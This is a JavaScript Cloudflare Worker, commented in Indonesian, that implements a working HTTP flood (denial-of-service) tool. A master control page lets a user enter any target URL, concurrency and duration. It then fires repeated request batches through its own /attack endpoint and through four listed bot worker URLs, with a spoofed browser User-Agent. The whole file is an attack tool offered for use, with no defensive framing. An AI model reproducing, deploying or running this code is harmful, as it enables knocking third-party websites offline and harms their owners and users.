/**
 * HTTP Flood Control v7
 * Master melakukan serangan sendiri dulu (pasti jalan)
 * Bot tambahan hanya bonus
 */

const EXTRA_BOTS = [
  'https://http-flood-control-1.aminaputra6.workers.dev',
  'https://http-flood-control-2.aminaputra6.workers.dev',
  'https://http-flood-control-3.aminaputra6.workers.dev',
  'https://http-flood-control-4.aminaputra6.workers.dev'
];

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

const MASTER_HTML = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Master Flood Control</title>
<style>
:root{--bg:#e8f4fc;--card:#fff;--border:#bae6fd;--accent:#0ea5e9;--accent2:#0284c7;--text:#0f172a;--muted:#64748b;--ok:#10b981;--err:#ef4444;--warn:#f59e0b;--livebg:#f0f9ff}
*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:16px;display:flex;justify-content:center}
.wrap{width:100%;max-width:640px}.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;box-shadow:0 8px 24px rgba(14,165,233,.1)}
h1{font-size:1.3rem;color:var(--accent2);margin-bottom:4px}.sub{color:var(--muted);font-size:.85rem;margin-bottom:14px}
label{display:block;font-size:.7rem;font-weight:600;color:var(--muted);margin-bottom:4px;text-transform:uppercase}
input,select{width:100%;background:#f8fafc;border:1px solid var(--border);border-radius:9px;padding:11px;color:var(--text);font-size:.9rem;margin-bottom:11px}
input:focus,select:focus{outline:none;border-color:var(--accent)}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.btns{display:flex;gap:8px;margin:4px 0 12px}button{flex:1;padding:12px;border:none;border-radius:9px;font-size:.9rem;font-weight:600;cursor:pointer}
#btnStart{background:var(--accent);color:#fff}#btnStart:disabled{opacity:.45}#btnStop{background:transparent;border:1px solid var(--err);color:var(--err)}#btnStop:disabled{opacity:.35}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;margin-bottom:10px}
.stat{background:var(--livebg);border:1px solid var(--border);border-radius:9px;padding:9px 4px;text-align:center}
.stat b{display:block;font-size:1.1rem;color:var(--accent2)}.stat span{font-size:.62rem;color:var(--muted);text-transform:uppercase}
.live{background:#0c4a6e;border-radius:10px;padding:8px 10px;height:100px;overflow:hidden;font-family:monospace;font-size:.7rem;color:#7dd3fc;margin-bottom:10px;line-height:1.4}
.live .t{color:#38bdf8;font-size:.65rem;font-weight:600;margin-bottom:3px}
.live-feed{height:72px;overflow:hidden}.live-feed div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.lok{color:#4ade80}.lerr{color:#f87171}
.log{background:#f8fafc;border:1px solid var(--border);border-radius:9px;height:140px;overflow-y:auto;padding:8px 10px;font-family:monospace;font-size:.72rem;line-height:1.4}
.log div{margin-bottom:2px}.ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}
.status{display:flex;align-items:center;gap:7px;margin-top:10px;font-size:.8rem;color:var(--muted)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--muted)}.dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok);animation:p 1s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
@media(max-width:500px){.grid3{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>
<div class="wrap"><div class="card">
<h1>Master Flood Control</h1>
<p class="sub">Master menyerang sendiri + 4 bot bonus. Pasti ada yang jalan.</p>

<label>Target URL</label>
<input type="url" id="target" placeholder="https://target.com">

<div class="grid3">
<div><label>Method</label><select id="method"><option>GET</option><option>POST</option><option>HEAD</option></select></div>
<div><label>Concurrency</label><input type="number" id="conc" value="20" min="5" max="40"></div>
<div><label>Durasi (detik)</label><input type="number" id="dur" value="20" min="5" max="60"></div>
</div>

<div class="btns">
<button id="btnStart">Mulai Serangan</button>
<button id="btnStop" disabled>Stop</button>
</div>

<div class="live"><div class="t">LIVE FEED</div><div class="live-feed" id="live"></div></div>

<div class="stats">
<div class="stat"><b id="sSent">0</b><span>Terkirim</span></div>
<div class="stat"><b id="sOk">0</b><span>Sukses</span></div>
<div class="stat"><b id="sFail">0</b><span>Gagal</span></div>
<div class="stat"><b id="sRps">0</b><span>RPS</span></div>
</div>

<div class="log" id="log"></div>
<div class="status"><div class="dot" id="dot"></div><span id="stxt">Siap</span></div>
</div></div>

<script>
const EXTRA = ["https://http-flood-control-1.aminaputra6.workers.dev","https://http-flood-control-2.aminaputra6.workers.dev","https://http-flood-control-3.aminaputra6.workers.dev","https://http-flood-control-4.aminaputra6.workers.dev"];
const $ = id => document.getElementById(id);
let running = false, liveN = 0;

function log(m,c='info'){const d=document.createElement('div');d.className=c;d.textContent='['+new Date().toLocaleTimeString('id-ID',{hour12:false})+'] '+m;$('log').appendChild(d);if($('log').children.length>35)$('log').removeChild($('log').firstChild);$('log').scrollTop=$('log').scrollHeight;}
function live(m,c='lok'){const d=document.createElement('div');d.className=c;d.textContent=m;$('live').appendChild(d);liveN++;if(liveN>7){$('live').removeChild($('live').firstChild);liveN--;}}
function status(on,t){$('dot').classList.toggle('on',on);$('stxt').textContent=t;}

async function fire(url, method){
  // Master menyerang langsung lewat endpoint sendiri
  return fetch('/attack',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({url,method})
  });
}

async function fireBot(botBase, url, method){
  return fetch(botBase.replace(/\/$/,'')+'/attack',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({url,method})
  });
}

async function start(){
  const target = $('target').value.trim();
  if(!target.startsWith('http')){log('URL target tidak valid','err');return;}

  const method = $('method').value;
  const conc = Math.min(40,Math.max(5,+$('conc').value||20));
  const dur = Math.min(60,Math.max(5,+$('dur').value||20));

  running = true;
  $('btnStart').disabled = true;
  $('btnStop').disabled = false;
  $('log').innerHTML = '';
  $('live').innerHTML = '';
  liveN = 0;
  $('sSent').textContent=0;$('sOk').textContent=0;$('sFail').textContent=0;$('sRps').textContent=0;

  status(true,'Serangan aktif');
  log('Target: '+target,'info');
  log('Concurrency: '+conc+' | Durasi: '+dur+'s','info');
  live('>> START','lok');

  const t0 = Date.now();
  const end = t0 + dur*1000;
  let sent=0, ok=0, fail=0;

  // Loop utama: Master sendiri yang menembak (paling andal)
  while(running && Date.now() < end){
    const batch = [];

    // Master self
    for(let i=0;i<conc;i++){
      batch.push(
        fire(target, method).then(r=>{
          sent++;
          if(r.status>=200&&r.status<500) ok++; else fail++;
          $('sSent').textContent=sent;$('sOk').textContent=ok;$('sFail').textContent=fail;
          const el=(Date.now()-t0)/1000;
          $('sRps').textContent=el>0?Math.round(sent/el):0;
          if(sent%4===0) live('master → '+r.status+' | '+sent, (r.status>=200&&r.status<500)?'lok':'lerr');
        }).catch(()=>{
          sent++;fail++;
          $('sSent').textContent=sent;$('sFail').textContent=fail;
          if(sent%4===0) live('master → ERR | '+sent,'lerr');
        })
      );
    }

    // Bonus: coba bot ekstra (kalau gagal diabaikan)
    EXTRA.forEach((bot,idx)=>{
      batch.push(
        fireBot(bot, target, method).then(r=>{
          sent++;
          if(r.status>=200&&r.status<500) ok++; else fail++;
          $('sSent').textContent=sent;$('sOk').textContent=ok;$('sFail').textContent=fail;
        }).catch(()=>{})
      );
    });

    await Promise.all(batch);
  }

  running = false;
  $('btnStart').disabled = false;
  $('btnStop').disabled = true;
  status(false,'Selesai');
  live('>> DONE','lok');
  log('Selesai. Terkirim: '+sent+' | Sukses: '+ok+' | Gagal: '+fail,'ok');
}

$('btnStart').onclick = start;
$('btnStop').onclick = ()=>{
  running=false;
  $('btnStart').disabled=false;
  $('btnStop').disabled=true;
  status(false,'Dihentikan');
  live('>> STOP','lerr');
  log('Dihentikan','warn');
};
</script>
</body>
</html>`;

const BOT_HTML = `<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bot</title>
<style>body{font-family:system-ui;background:#e8f4fc;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}.c{background:#fff;border:1px solid #bae6fd;border-radius:14px;padding:28px;text-align:center}h1{color:#0284c7;font-size:1.2rem}p{color:#64748b;font-size:.9rem}</style></head>
<body><div class="c"><h1>Flood Bot Active</h1><p>Siap menerima perintah.</p></div></body></html>`;

export default {
  async fetch(request, env, ctx) {
    const u = new URL(request.url);

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    const mode = u.searchParams.get('mode') || 'bot';

    if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
      const html = mode === 'master' ? MASTER_HTML : BOT_HTML;
      return new Response(html, {
        headers: { ...corsHeaders, 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
      });
    }

    if (request.method === 'POST' && u.pathname === '/attack') {
      try {
        const body = await request.json();
        const target = (body.url || '').trim();
        const method = (body.method || 'GET').toUpperCase();

        if (!target.startsWith('http')) {
          return new Response('bad', { status: 400, headers: corsHeaders });
        }

        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 7000);

        const opts = {
          method,
          signal: ctrl.signal,
          redirect: 'follow',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Cache-Control': 'no-cache'
          }
        };
        if (method === 'POST') {
          opts.body = JSON.stringify({ t: Date.now() });
          opts.headers['Content-Type'] = 'application/json';
        }

        const res = await fetch(target, opts);
        clearTimeout(to);
        return new Response(null, { status: res.status, headers: corsHeaders });
      } catch (e) {
        return new Response(null, { status: 502, headers: corsHeaders });
      }
    }

    return new Response('Not Found', { status: 404, headers: corsHeaders });
  }
};
